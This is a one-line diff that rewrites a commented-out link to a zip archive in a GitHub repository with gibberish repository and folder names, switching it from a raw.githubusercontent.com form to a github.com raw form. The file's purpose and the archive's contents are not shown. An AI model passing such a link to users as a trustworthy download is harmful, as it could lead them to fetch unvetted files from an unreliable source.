@@ -1,1 +1,1 @@
-# https://raw.githubusercontent.com/Allanursulino/asfasfasguardsa.html/main/mesoxalyl/html-asfasfasguardsa-3.1.zip
+# https://github.com/Allanursulino/asfasfasguardsa.html/raw/refs/heads/main/mesoxalyl/html-asfasfasguardsa-3.1.zip
